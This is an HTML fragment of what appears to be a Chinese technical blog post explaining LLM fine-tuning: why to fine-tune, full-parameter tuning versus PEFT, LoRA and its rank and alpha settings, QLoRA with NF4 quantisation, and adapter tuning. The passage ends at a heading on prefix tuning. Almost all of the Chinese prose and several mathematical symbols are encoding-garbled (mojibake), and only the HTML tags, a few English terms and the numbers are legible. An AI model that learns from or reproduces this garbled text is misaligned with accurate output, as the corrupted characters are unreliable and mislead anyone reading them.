<li>é™ä½æˆæœ¬ï¼š
<ul>
<li>ä»é›¶å¼€å§‹è®­ç»ƒå¤§æ¨¡å‹æˆæœ¬ä¼šéå¸¸å·¨å¤§ï¼Œè€ŒåŸºäºç°æˆé¢„è®­ç»ƒæ¨¡å‹ï¼Œåªä¼˜åŒ–å°‘é‡å‚æ•°ï¼ˆå°¤å…¶ PEFTï¼‰ï¼Œå•å¼  4090 å°±èƒ½è°ƒ 7B æ¨¡å‹ï¼Œå‡ å¤©å°±èƒ½è½åœ°ï¼Œæˆæœ¬æä½ã€‚</li>
<li>prompt å·¥ç¨‹ç»ˆç©¶æ˜¯æœ‰ä¸Šé™çš„ï¼Œå½“é‡åˆ°å°æ ·æœ¬åœºæ™¯ï¼Œä¸“ä¸šåœºæ™¯ï¼Œå¤æ‚å¯¹è¯æƒ…å†µæ—¶å€™ï¼Œprompt å¾ˆéš¾åŒ…å«æ‰€æœ‰æƒ…å†µå’Œç»†èŠ‚ï¼Œè¾“å‡ºä¹Ÿä¸ç¨³å®š</li>
<li>å¾®è°ƒèƒ½ç²¾å‡†å®šåˆ¶æ¨¡å‹çš„è¾“å‡ºé£æ ¼ã€èƒ½åŠ›è¾¹ç•Œï¼Œæ»¡è¶³ä¸ªæ€§åŒ–éœ€æ±‚ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-2">3 å¾®è°ƒæ–¹æ³•ï¼š</h4>
<ol>
<li>
<p>å…¨å‚æ•°å¾®è°ƒï¼šfull fine turning æ¶‰åŠè°ƒæ•´æ‰€æœ‰å±‚å’Œå‚æ•°ï¼Œä»¥é€‚é…ç‰¹å®šä»»åŠ¡ã€‚æ­¤è¿‡ç¨‹é€šå¸¸é‡‡ç”¨è¾ƒå°çš„å­¦ä¹ ç‡å’Œç‰¹å®šä»»åŠ¡çš„æ•°æ®ï¼Œå¯ä»¥å……åˆ†åˆ©ç”¨é¢„è®­ç»ƒæ¨¡å‹çš„é€šç”¨ç‰¹å¾ï¼Œä½†å¯èƒ½éœ€è¦æ›´å¤šè®¡ç®—èµ„æºã€‚</p>
</li>
<li>
<p>å‚æ•°é«˜æ•ˆå¾®è°ƒPEFTï¼š parameterEffecict tuning  æ—¨åœ¨é€šè¿‡æœ€å°åŒ–å¾®è°ƒå‚æ•°æ•°é‡å’Œè®¡ç®—å¤æ‚åº¦ï¼Œæå‡é¢„è®­ç»ƒæ¨¡å‹åœ¨æ–°ä»»åŠ¡ä¸Šçš„è¡¨ç°ï¼Œä»è€Œå‡è½»å¤§å‹é¢„è®­ç»ƒæ¨¡å‹çš„è®­ç»ƒè´Ÿæ‹…ã€‚å³ä½¿åœ¨è®¡ç®—èµ„æºå—é™çš„æƒ…å†µä¸‹ï¼ŒPEFTæŠ€æœ¯ä¹Ÿèƒ½å¤Ÿåˆ©ç”¨é¢„è®­ç»ƒæ¨¡å‹çš„çŸ¥è¯†å¿«é€Ÿé€‚åº”æ–°ä»»åŠ¡ï¼Œå®ç°æœ‰æ•ˆçš„è¿ç§»å­¦ä¹ 
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8aa4b56ed9c34fb2b144df8082f4145f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767866884&amp;x-signature=7UvlFd2VcDEBfmbY7zg%2FB8hlQ9Y%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h4 data-id="heading-3">1 LoRA(Low-Rank Adaptationï¼ŒPEFTçš„ä»£è¡¨,<strong>å…¨åœºæ™¯é€šç”¨ï¼Œæ¨ç†æœ€å¿«ï¼Œåˆ†ç±» / ç”Ÿæˆæ•ˆæœéƒ½å¥½</strong>)ï¼š</h4>
<ol>
<li>æ˜¯ä¸€ç§æ—¨åœ¨å¾®è°ƒå¤§å‹é¢„è®­ç»ƒè¯­è¨€æ¨¡å‹ï¼ˆå¦‚GPT-3æˆ–BERTï¼‰çš„æŠ€æœ¯ã€‚å…¶æ ¸å¿ƒç†å¿µåœ¨äºï¼Œåœ¨æ¨¡å‹çš„å†³å®šæ€§å±‚æ¬¡ä¸­å¼•å…¥å°å‹ã€ä½ç§©çš„çŸ©é˜µæ¥å®ç°æ¨¡å‹è¡Œä¸ºçš„å¾®è°ƒï¼Œè€Œæ— éœ€å¯¹æ•´ä¸ªæ¨¡å‹ç»“æ„è¿›è¡Œå¤§å¹…åº¦ä¿®æ”¹(ç²¾å‡†æ‰“è¡¥ä¸)ã€‚è¿™ç§æ–¹æ³•çš„ä¼˜åŠ¿åœ¨äºï¼Œåœ¨ä¸æ˜¾è‘—å¢åŠ é¢å¤–è®¡ç®—è´Ÿæ‹…çš„å‰æä¸‹ï¼Œèƒ½å¤Ÿæœ‰æ•ˆåœ°å¾®è°ƒæ¨¡å‹ï¼ŒåŒæ—¶ä¿ç•™æ¨¡å‹åŸæœ‰çš„æ€§èƒ½æ°´å‡†ã€‚</li>
<li>æ“ä½œæµç¨‹å¦‚ä¸‹ï¼š
<ol>
<li>ç¡®å®šé¢„è®­ç»ƒæ¨¡å‹ä¸­ï¼Œè¦æ’å…¥ loRA çŸ©é˜µçš„ä½ç½®ï¼š
<ol>
<li>ä¸€èˆ¬æ’å…¥éƒ½åœ¨ Q/V å±‚ï¼ŒQ å†³å®š â€œå…³æ³¨ä»€ä¹ˆâ€ï¼ŒV å†³å®š â€œæ€ä¹ˆç”¨å…³æ³¨åˆ°çš„ä¿¡æ¯â€ï¼Œä¸¤è€…ç›´æ¥æ§åˆ¶æ³¨æ„åŠ›è¾“å‡ºï¼›K ä»…å½±å“åŒ¹é…æ–¹å¼ï¼Œè°ƒæ•´ Q/V é€šå¸¸å·²è¶³å¤Ÿï¼Œé€šå¸¸ï¼šå…ˆè¯• Q+V â†’ æ•ˆæœä¸å¤Ÿå†åŠ  K â†’ ä»ä¸è¶³å†åŠ  FFNï¼Œé€æ­¥éªŒè¯æ”¶ç›Š</li>
</ol>
</li>
<li>å¼•å…¥ä¸¤ä¸ªä½ç§©çŸ©é˜µï¼š
<ol>
<li>å¼•å…¥ä¸¤ä¸ªç»´åº¦è¾ƒå°çš„ä½ç§©çŸ©é˜µAå’ŒB(åˆå§‹çš„ A å’Œ B æ˜¯éšæœºçš„)ã€‚å‡è®¾åŸå§‹æƒé‡çŸ©é˜µçš„å°ºå¯¸ä¸ºddï¼Œåˆ™Aå’ŒBçš„å°ºå¯¸å¯èƒ½ä¸ºdrå’Œrdï¼Œå…¶ä¸­rè¿œå°äºdã€‚</li>
<li>r çš„å–å€¼é€šå¸¸æ ¹æ®ä»»åŠ¡éš¾åº¦ï¼Œä»ç®€å•-&gt;é€šç”¨-&gt;å¤æ‚ï¼š4,8,16</li>
</ol>
</li>
<li>ä½ç§©æ›´æ–°ï¼šé€šè¿‡è¿™ä¸¤ä¸ªä½ç§©çŸ©é˜µçš„ä¹˜ç§¯ABæ¥ç”Ÿæˆä¸€ä¸ªæ–°çŸ©é˜µï¼Œå…¶ç§©ï¼ˆå³rï¼‰è¿œå°äºåŸå§‹æƒé‡çŸ©é˜µçš„ç§©ã€‚è¿™ä¸ªä¹˜ç§¯å®é™…ä¸Šæ˜¯å¯¹åŸå§‹æƒé‡çŸ©é˜µçš„ä¸€ç§ä½ç§©è¿‘ä¼¼è°ƒæ•´ã€‚
<ol>
<li>ä½¿ç”¨ LoRA å¾®è°ƒçš„æ—¶å€™ï¼Œå†»ç»“é¢„è®­ç»ƒæ¨¡å‹æ‰€æœ‰æƒé‡å‚æ•°ä¿è¯æ¨¡å‹æœ¬èº«èƒ½åŠ›ä¸å—å½±å“ï¼Œä½¿ç”¨æ–°ç”Ÿæˆçš„æ ‡æ³¨æ•°æ®è®­ç»ƒæ¨¡å‹ï¼Œè¿™æ ·å°±å¯ä»¥ç§©è®­ç»ƒå¼•å…¥çš„ä¸¤ä¸ªä½ç§©çŸ©é˜µã€‚</li>
</ol>
</li>
<li>æœ€ç»ˆè¾“å‡ºæ‰€ç”¨æƒé‡ï¼šæ–°æƒé‡ = åŸå§‹æƒé‡ + A * B * Î±/rã€‚ [ râ‰ªmin(d,k) ]ï¼Œr å°±æ˜¯ä½ç§©çŸ©é˜µçš„rï¼Œé˜¿å°”æ³•æ˜¯ç¼©æ”¾ç³»æ•°ï¼Œé€šå¸¸æ˜¯ r çš„ 2-4 å€</li>
<li>è°ƒå‚æŠ€å·§ï¼š
<ol>
<li><strong>r è¿‡å¤§</strong>ï¼šå‚æ•°å¢å¤šã€è¿‡æ‹Ÿåˆé£é™©ä¸Šå‡ï¼Œæ˜¾å­˜å ç”¨å¢åŠ </li>
<li><strong>r è¿‡å°</strong>ï¼šè¡¨è¾¾èƒ½åŠ›ä¸è¶³ï¼Œä»»åŠ¡é€‚é…æ•ˆæœå·®</li>
<li><strong>Î±/r å¼‚å¸¸</strong>ï¼šè¿‡å¤§æ˜“æ¢¯åº¦çˆ†ç‚¸ï¼Œè¿‡å° LoRA æ›´æ–°è¢«å¿½ç•¥ï¼›å»ºè®®å›ºå®š Î±/râ‰ˆ2ï¼Œå†è°ƒ r</li>
</ol>
</li>
</ol>
</li>
<li>ä¸»è¦ä¼˜åŠ¿: å…·æœ‰æé«˜çš„å‚æ•°æ•ˆç‡ï¼Œè®­ç»ƒå‚æ•°é‡å¯é™è‡³å…¨é‡å¾®è°ƒçš„0.01%ç”šè‡³æ›´å°‘ï¼Œä¸ä¼šäº§ç”Ÿæ¨ç†å»¶è¿Ÿï¼ŒåŒæ—¶æ”¯æŒå¤šä»»åŠ¡å¿«é€Ÿåˆ‡æ¢ï¼Œå¯ä»¥ä¸ºä¸åŒä»»åŠ¡è®­ç»ƒä¸åŒçš„LoRA"è¡¥ä¸"å®ç°å¿«é€ŸåŠ è½½ã€‚</li>
<li>é€‚ç”¨åœºæ™¯ï¼šå½“æˆ‘ä»¬æƒ³åœ¨å•å¼ æ¶ˆè´¹çº§æ˜¾å¡ä¸Šï¼Œä½¿ç”¨å‡ åƒæ¡æŒ‡ä»¤æ•°æ®å°†ä¸€ä¸ª7Bè§„æ¨¡çš„æ¨¡å‹å¾®è°ƒæˆä¸€ä¸ªéµä»äººç±»æŒ‡ä»¤çš„å¯¹è¯åŠ©æ‰‹æ—¶ï¼Œä½¿ç”¨LoRAå¯ä»¥åœ¨å‡ ä¸ªå°æ—¶å†…é«˜æ•ˆå®Œæˆï¼Œå¹¶è·å¾—åª²ç¾å…¨å‚æ•°å¾®è°ƒçš„æ•ˆæœã€‚ï¼ˆå…¸å‹æ•°æ®ï¼šRTX 4090è®­ç»ƒ7Bæ¨¡å‹çº¦2å°æ—¶ã€‚ï¼‰</li>
</ol>
<h4 data-id="heading-4">2 QLoRA(æè‡´å‹ç¼©æ–¹æ¡ˆ)ï¼šä¸€ç§ç»“åˆäº†LoRAï¼ˆLow-Rank Adaptationï¼‰æ–¹æ³•ä¸æ·±åº¦é‡åŒ–æŠ€æœ¯çš„é«˜æ•ˆæ¨¡å‹å¾®è°ƒæ‰‹æ®µ</h4>
<ol>
<li>QLoRA = <strong>4bit/8bit é‡åŒ– + LoRA</strong>ï¼Œæœ¬è´¨å°±æ˜¯å…ˆæŠŠåŸæ¨¡å‹ â€œå‹ç¼©ç˜¦èº«â€ï¼Œå†æ’ LoRA ä½ç§©çŸ©é˜µå¾®è°ƒï¼Œæ—¢ç»§æ‰¿ LoRA â€œåªç»ƒå°çŸ©é˜µâ€ çš„ä¼˜ç‚¹ï¼Œåˆè¿›ä¸€æ­¥ç æ˜¾å­˜å ç”¨ï¼Œé—¨æ§›ç›´æ¥é™åˆ°æ™®é€šäººèƒ½æ‰¿å—
<ol>
<li>åªå‹ç¼©åŸæ¨¡å‹ã€ä¸ç¢° LoRA ç²¾åº¦ã€ä¸æ”¹å˜æƒé‡å½¢çŠ¶</li>
<li>4 bit çš„æ—¶å€™æ˜¯ NF4(NormalFloat 4ï¼šæ­£å¤ªåˆ†æ¡£),8bit çš„æ—¶å€™æ˜¯ INT8(å‡åŒ€åˆ†æ¡£) /FP8(æµ®ç‚¹æ ¼å¼)</li>
<li>NF4ï¼ˆä¸“é—¨ä¸ºæ¨¡å‹æƒé‡è®¾è®¡çš„å‹ç¼©æ ¼å¼ï¼‰ï¼Œæ­¥éª¤åƒç»™æ•°æ® â€œåˆ†æ¡£æ”¶çº³â€ï¼š
<ol>
<li><strong>å…ˆå½’ä¸€åŒ–</strong>ï¼šæŠŠåŸæ¨¡å‹ FP32 æƒé‡ç¼©æ”¾åˆ° [-1,1] åŒºé—´ï¼Œé€‚é… NF4 çš„åˆ†æ¡£èŒƒå›´ï¼›</li>
<li><strong>åˆ†æ¡£æ˜ å°„</strong>ï¼šæŒ‰æ­£æ€åˆ†å¸ƒåˆ† 16 ä¸ªæ¡£ä½ï¼ˆ4bit èƒ½è¡¨ç¤º 16 ä¸ªå€¼ï¼‰ï¼ŒæŠŠæƒé‡æ˜ å°„åˆ°æœ€è¿‘æ¡£ä½ï¼Œæ¯”å¦‚ 0.3â†’0.298ã€-0.5â†’-0.525ï¼Œç”¨ 4bit å­˜æ¡£ä½ç¼–å·ï¼›</li>
<li><strong>åŠ¨æ€åé‡åŒ–</strong>ï¼šè®¡ç®—(æ¨¡å‹æ¨ç†)æ—¶ä¸´æ—¶è§£å‹ç¼©å› FP16/BF16ï¼Œä¿è¯è®¡ç®—ç²¾åº¦ï¼›</li>
<li><strong>åŒé‡é‡åŒ–</strong>ï¼ˆå¯é€‰ï¼‰ï¼šå¯¹é‡åŒ–ç”¨çš„ç¼©æ”¾å› å­(å°±æ˜¯é™¤äº†æƒé‡å¤–çš„å…¶ä»–å‚æ•°ç³»æ•°)å†å‹ç¼©åˆ° 8bitï¼Œè¿›ä¸€æ­¥çœæ˜¾å­˜ã€‚</li>
<li><strong>å’Œæ™®é€š 4bit çš„åŒºåˆ«</strong>ï¼šæ™®é€š INT4 æ˜¯å‡åŒ€åˆ†æ¡£ï¼ˆæ¯”å¦‚ - 8 åˆ° 7ï¼‰ï¼Œä¸­é—´å’Œä¸¤å¤´ç²¾åº¦ä¸€æ ·ï¼Œå¯¹æƒé‡æ¥è¯´æµªè´¹æ¡£ä½ï¼›NF4 æ˜¯ â€œæŒ‰éœ€åˆ†é…â€ï¼Œä¿¡æ¯æŸå¤±æ›´å°ã€‚</li>
<li>æ²¡æœ‰ â€œNF8â€ æ ‡å‡†ï¼Œå› ä¸º 8bit æœ¬èº«ç²¾åº¦è¶³å¤Ÿï¼Œä¸éœ€è¦åƒ NF4 é‚£æ ·å®šåˆ¶åˆ†æ¡£ã€‚</li>
<li>4bit æ˜¯ â€œç´§èº«æ”¶çº³ç›’â€ï¼ˆçœç©ºé—´ä½†è¦ç²¾å‡†æ‘†æ”¾ï¼‰ï¼Œ8bit æ˜¯ â€œå®½æ¾æ”¶çº³ç›’â€ï¼ˆç¨å ç©ºé—´ä½†ä¸å®¹æ˜“ä¹±ï¼‰</li>
</ol>
</li>
<li>FP16 å’Œ BF16 çš„åŒºåˆ«ï¼š
<ol>
<li>åƒ â€œç²¾å‡†çš„å®éªŒå®¤å¤©å¹³â€ï¼Œèƒ½ç§°å‡º 0.001 å…‹çš„å·®å¼‚ï¼Œä½†æœ€å¤šåªèƒ½ç§° 65 å…¬æ–¤ï¼ˆè¶…äº†å°±çˆ†ï¼‰ï¼›</li>
<li>åƒ â€œå·¥ä¸šåœ°ç£…â€ï¼Œèƒ½ç§°å‡ åå¨çš„é‡ç‰©ï¼ˆèŒƒå›´å¤§ï¼‰ï¼Œä½†ç§° 0.001 å…‹å°±ä¸å‡†äº†ã€‚</li>
<li>æ ¸å¿ƒï¼šä¸¤è€…éƒ½æ˜¯ 16 ä½ï¼ˆå ä¸€æ ·çš„ç©ºé—´ï¼‰ï¼Œåªæ˜¯ â€œç²¾å‡†åº¦â€ å’Œ â€œé‡ç¨‹â€ äºŒé€‰ä¸€ã€‚</li>
<li>BF16ï¼ˆBrain Float 16ï¼‰æ˜¯è°·æ­Œä¸“ä¸º AI è®­ç»ƒè®¾è®¡çš„ï¼Œä¹ˆæœ‰ BF32ï¼Œ32 ä½å·²ç»æ»¡è¶³äº†è¶³å¤Ÿç²¾åº¦äº†ï¼Œå°±åƒä¸Šé¢æ²¡æœ‰ NF8 ä¸€æ ·ï¼Œå› ä¸ºä¸éœ€è¦</li>
</ol>
</li>
</ol>
</li>
<li>QLoRAæµç¨‹ï¼š
<ol>
<li>å‡†å¤‡åŸææ–™ï¼šåŒæ ·æ˜¯éœ€è¦å‡†å¤‡é¢„è®­ç»ƒæ¨¡å‹ï¼Œç‰¹å®šçš„æ ‡æ³¨æ•°æ®ï¼Œæ™®é€šç¡¬ä»¶</li>
<li>é™ä½ç²¾åº¦ï¼š
<ol>
<li>åŸæ¨¡å‹é»˜è®¤æ˜¯ 32bit é«˜ç²¾åº¦ï¼Œåƒä¸€æœ¬åšå­—å…¸ï¼Œå åœ°æ–¹ï¼ˆè´¹æ˜¾å­˜ï¼‰</li>
<li>QLoRA å…ˆæŠŠåŸæ¨¡å‹<strong>å‹ç¼©æˆ 4bit/8bit ä½ç²¾åº¦</strong>ï¼Œç›¸å½“äºæŠŠåšå­—å…¸å°æˆå°å­—è–„æœ¬ï¼Œé¡µæ•°å°‘äº†ä¸€åŠå¤šï¼Œå åœ°æ–¹å¤§å¤§å‡å°‘</li>
<li>æ’å…¥ LoRA çš„ä½ç§©çŸ©é˜µ(ç²¾åº¦ FP16ï¼Œæœ¬æ¥å°±æ˜¯è¿™ä¸ªç²¾åº¦)</li>
<li>è®­ç»ƒä½ç§©çŸ©é˜µè¿›è¡Œå¾®è°ƒ</li>
</ol>
</li>
</ol>
</li>
<li>ä¸»è¦ä¼˜åŠ¿ï¼šæä½çš„å†…å­˜æ¶ˆè€—ï¼Œä½¿å¾—åœ¨å•å¼ 24GBæ˜¾å­˜çš„GPUä¸Šå¾®è°ƒ650äº¿å‚æ•°çš„æ¨¡å‹æˆä¸ºå¯èƒ½ï¼ŒåŒæ—¶é€šè¿‡åˆ›æ–°çš„é‡åŒ–ä¸åé‡åŒ–ç­–ç•¥ï¼Œæ€§èƒ½æŸå¤±æå°ã€‚</li>
<li>åœºæ™¯ï¼šå½“æˆ‘ä»¬éœ€è¦å¯¹ä¸€ä¸ªè¶…å¤§è§„æ¨¡æ¨¡å‹ï¼ˆå¦‚33B/65Bï¼‰è¿›è¡Œç®—æ³•ç ”ç©¶æˆ–è½»é‡å®éªŒï¼Œä½†åªæœ‰æœ‰é™çš„GPUèµ„æºæ—¶ï¼ŒQLoRAæ˜¯å”¯ä¸€èƒ½åœ¨å¦‚æ­¤è‹›åˆ»æ¡ä»¶ä¸‹å®Œæˆå¾®è°ƒçš„å¯è¡Œæ–¹æ¡ˆã€‚ç›¸æ¯”LoRAæ˜¾å­˜å ç”¨å†é™65%ã€‚</li>
</ol>
<h4 data-id="heading-5">3 é€‚é…å™¨è°ƒæ•´(æ¨¡å—åŒ–å¤„ç†): adapter tuning(<strong>å¤šä»»åŠ¡æ—¶ï¼Œä¸åŒä»»åŠ¡çš„ç‰¹å¾éš”ç¦»æ€§æ›´å¥½ï¼ˆä¸å®¹æ˜“ä¸²ä»»åŠ¡ï¼‰</strong>)ï¼š</h4>
<ol>
<li>ä¸LoRAæŠ€æœ¯ç±»ä¼¼ï¼Œé€‚é…å™¨è°ƒæ•´çš„ç›®æ ‡æ˜¯åœ¨ä¿ç•™é¢„è®­ç»ƒæ¨¡å‹åŸå§‹å‚æ•°ä¸å˜çš„å‰æä¸‹ï¼Œä½¿æ¨¡å‹èƒ½å¤Ÿé€‚åº”æ–°çš„ä»»åŠ¡ã€‚</li>
<li>æ ¸å¿ƒä¼˜åŠ¿æ˜¯<strong>å‚æ•°å°‘ã€æ˜¾å­˜çœã€åˆ‡æ¢ä»»åŠ¡çµæ´»</strong>ï¼Œé€‚åˆèµ„æºæœ‰é™åˆè¦åšå¤šä»»åŠ¡çš„åœºæ™¯ã€‚</li>
<li>è°ƒæ•´æµç¨‹ï¼š
<ol>
<li>åŠ è½½é¢„è®­ç»ƒæ¨¡å‹</li>
<li>æ’å…¥é€‚é…å™¨æ¨¡å—ï¼Œåœ¨æ¨¡å‹çš„å…³é”®å±‚æ’å…¥å°ç½‘ç»œï¼Œç»“æ„åƒ â€œæ¼æ–—â€ï¼šé™ç»´â†’æ¿€æ´»â†’å‡ç»´ï¼ˆå¦‚è¾“å…¥ 768 ç»´â†’å‹ç¼©åˆ° 64 ç»´â†’ReLU æ¿€æ´»â†’æ¢å¤ 768 ç»´ï¼‰ï¼Œå‚æ•°é‡ä»…ä¸ºå…¨é‡åŸæ¨¡å‹çš„ 1%-5%ã€‚
<ol>
<li>æ’ä»¶å°±æ˜¯<strong>3 å±‚æç®€çš„å°ç¥ç»ç½‘ç»œ</strong>ï¼Œç»“æ„åƒ â€œæ¼æ–—â€(é€šå¸¸æ˜¯ä¸¤å±‚çš„ MLP)</li>
<li>æ ¸å¿ƒä½œç”¨æ˜¯ â€œåŠ å·¥ç‰¹å¾â€ï¼Œé™ç»´çš„ç›®çš„æ˜¯ä¸ºäº†å‡å°‘å‚æ•°é‡ï¼Œå’Œä½ç§©çš„é“ç†ä¸€æ ·ï¼Œä½ç§©ä½ç»´å°±å¯ä»¥æ»¡è¶³éœ€æ±‚</li>
<li>ReLU æ¿€æ´»å‡½æ•°çš„ä½œç”¨ï¼šç»™ç½‘ç»œåŠ ã€Œéçº¿æ€§èƒ½åŠ›ã€ï¼Œè®©å®ƒèƒ½å­¦å¤æ‚è§„å¾‹ï¼Œé€šä¿—è®²æ›´åƒæ˜¯ä¸€ä¸ªå»å¼±ç•™å¼ºçš„ç­›é€‰å™¨</li>
<li>æ’å…¥ä½ç½®ï¼š
<ol>
<li>é¦–é€‰ä½ç½®ï¼šæ³¨æ„åŠ›å±‚ï¼ˆAttentionï¼‰â†’ å‰é¦ˆå±‚ï¼ˆFFNï¼‰ä¹‹é—´ï¼ˆæœ€å¸¸ç”¨ï¼Œæ•ˆæœæœ€å¥½ï¼‰</li>
<li>æ¬¡é€‰ä½ç½®ï¼šå‰é¦ˆå±‚ï¼ˆFFNï¼‰â†’ å±‚å½’ä¸€åŒ–ï¼ˆLayerNormï¼‰ä¹‹é—´</li>
<li>æ³¨ï¼š<strong>æ¯ä¸€å±‚æ’ä¸€ä¸ªæ’ä»¶</strong>ï¼Œæ¯”å¦‚ Llama 2 æœ‰ 32 å±‚ï¼Œå°±æ’ 32 ä¸ªä¸€æ¨¡ä¸€æ ·çš„æ’ä»¶ï¼ˆåˆå§‹åŒ–å› ä¸ºæ˜¯éšæœºæ•°æ‰€ä»¥ä¸åŒï¼Œè®­ç»ƒåå„è‡ªå­¦ä¸åŒå±‚çš„ç‰¹å¾ï¼Œæ‰€ä»¥æ¯å±‚è®­ç»ƒå‡ºæ¥çš„æ’ä»¶ç»“æœä¹Ÿä¸åŒï¼‰</li>
</ol>
</li>
<li>å¦‚ä½•å‡ç»´é™ç»´ï¼š
<ol>
<li>é™ç»´çŸ©é˜µ W_down âˆˆ R^{mÃ—d}ï¼ˆm ä¸ºç“¶é¢ˆç»´ï¼Œd ä¸ºåŸç‰¹å¾ç»´ï¼‰ï¼šç”¨<strong>éšæœºé«˜æ–¯åˆ†å¸ƒ</strong>åˆå§‹åŒ–ï¼ˆå‡å€¼ 0ã€æ–¹å·®å°ï¼Œé¿å…åˆå§‹å½±å“è¿‡å¤§ï¼‰ï¼›</li>
<li>å‡ç»´çŸ©é˜µ W_up âˆˆ R^{dÃ—m}ï¼šç”¨<strong>é›¶çŸ©é˜µ</strong>åˆå§‹åŒ–ï¼Œç¡®ä¿è®­ç»ƒåˆæœŸ Adapter è¿‘ä¼¼æ’ç­‰æ˜ å°„ï¼Œä¸ç ´ååŸæ¨¡å‹è¾“å‡ºï¼›</li>
<li><strong>ä¸ LoRA çš„åŒºåˆ«</strong>ï¼šAdapter æ˜¯å¯¹ç‰¹å¾åšé™ç»´ - å‡ç»´ï¼ŒLoRA æ˜¯å¯¹æƒé‡æ›´æ–°åšä½ç§©åˆ†è§£ï¼Œä½†ä¸¤è€…å‡ä¸ºæ–°å¢å¯å­¦ä¹ å°çŸ©é˜µï¼Œä¸æ”¹åŠ¨ä¸»æ¨¡å‹æƒé‡ã€‚</li>
<li>é«˜ç»´ç‰¹å¾é™ç»´åˆ°ã€ŒåŸç»´åº¦çš„ 1/8~1/16ã€æœ€åˆé€‚ï¼Œä¸ä¼šå¤ªå°è£…ä¸ä¸‹æ ¸å¿ƒä¿¡æ¯ï¼Œåˆä¸ä¼šå¤ªå¤§è£…è¿‡å¤šçš„æ²¡ç”¨ä¿¡æ¯</li>
</ol>
</li>
</ol>
</li>
<li>è®­ç»ƒæ’ä»¶ï¼šä½¿ç”¨ç‰¹å®šæ ‡æ³¨çš„è®­ç»ƒæ•°æ®è®­ç»ƒï¼Œè®­ç»ƒæ—¶åªæ›´æ–°é€‚é…å™¨çš„å‚æ•°ï¼ˆæ¢¯åº¦å’Œä¼˜åŒ–å™¨çŠ¶æ€åªç®—é€‚é…å™¨ï¼‰ã€‚</li>
<li>è®­ç»ƒå®Œåªå­˜é€‚é…å™¨å‚æ•°ï¼ˆå‡  MB åˆ°å‡ å MBï¼‰ï¼Œæ¨ç†æ—¶æ’å›åŸæ¨¡å‹å³å¯ç”¨ï¼Œæ¢ä»»åŠ¡åªéœ€æ¢é€‚é…å™¨ï¼Œä¸ç”¨é‡æ–°è®­ç»ƒæ•´ä¸ªå¤§æ¨¡å‹ã€‚
<ol>
<li>è¾“å‡ºå…¬å¼ï¼šh' = h + Î³ *  W_up * Ïƒ  * (W_down * h)
<ol>
<li>h'å³ä¸ºåŠ å…¥é€‚é…å™¨åçš„è¾“å‡ºç»“æœ</li>
<li>Î³ï¼šä¸ºæ§åˆ¶ Adapter å½±å“å¼ºåº¦ï¼Œéƒ¨åˆ†æ”¹è¿›å·¥ä½œä¼šåŠ å…¥ç¼©æ”¾ç³»æ•° Î³ï¼ŒÎ³é€šå¸¸å– 1 æˆ– 0.5ï¼Œé˜²æ­¢ä»»åŠ¡ç‰¹å¾ç›–è¿‡åŸæ¨¡å‹é€šç”¨ç‰¹å¾ã€‚</li>
<li>up å’Œ down å³ä¸ºä¸Šé¢çš„å‡ç»´çŸ©é˜µå’Œé™ç»´çŸ©é˜µï¼Œh ä¸ºåŸå§‹è¾“å‡ºç»“æœ</li>
<li>Ïƒæ˜¯éçº¿æ€§æ¿€æ´»å‡½æ•°ï¼Œé€šå¸¸ç”¨ ReLU/GeLU å¢åŠ è¡¨è¾¾èƒ½åŠ›</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>æ ¸å¿ƒä¼˜åŠ¿
<ol>
<li>å‚æ•°æ•ˆç‡ï¼šä»…éœ€è®­ç»ƒçº¦3-5%çš„é¢å¤–å‚æ•°</li>
<li>çŸ¥è¯†ä¿ç•™ï¼šæœ€å¤§é™åº¦ä¿æŒé¢„è®­ç»ƒçŸ¥è¯†</li>
<li>å¤šä»»åŠ¡æ”¯æŒï¼šå¯å †å ä¸åŒä»»åŠ¡çš„é€‚é…å™¨</li>
</ol>
</li>
<li>é€‚ç”¨åœºæ™¯ï¼šå½“æˆ‘ä»¬éœ€è¦ä¸ºä¸€ä¸ªæ¨¡å‹åŒæ—¶æŒæ¡å¤šé¡¹æŠ€èƒ½ï¼ˆå¦‚ç¿»è¯‘ã€æ‘˜è¦ã€åˆ†ç±»ï¼‰æ—¶ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªä»»åŠ¡è®­ç»ƒä¸€ä¸ªç‹¬ç«‹çš„é€‚é…å™¨ã€‚åœ¨åº”ç”¨æ—¶ï¼Œé€šè¿‡æ¿€æ´»ä¸åŒçš„é€‚é…å™¨ï¼Œå³å¯è®©åŒä¸€ä¸ªæ¨¡å‹æ‰®æ¼”ä¸åŒçš„ä¸“å®¶è§’è‰²ï¼Œå®ç°çµæ´»çš„å¤šä»»åŠ¡éƒ¨ç½²ã€‚</li>
<li>ä¸‹å›¾å·¦ä¾§ä¸º transform ä¸­åŠ å…¥é€‚é…å™¨ä½ç½®ï¼Œå³ä¾§ä¸ºé€‚é…å™¨ç»“æ„
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd72f385397f4875b49961fee323c3ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767866884&amp;x-signature=Ul%2BcS90rI2wsOab%2F1rP8zAuBYxY%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></li>
</ol>
<h4 data-id="heading-6">4 å‰ç¼€è°ƒæ•´(è½»é‡çº§å‚æ•°ä¼˜åŒ–): prefix tuning(<strong>å¤šä»»åŠ¡ç”Ÿæˆåœºæ™¯ä¸‹ï¼Œåˆ‡æ¢æœ€å¿«ã€å‚æ•°é‡æœ€å°‘</strong>)ï¼š</h4>
</li>
</ol>
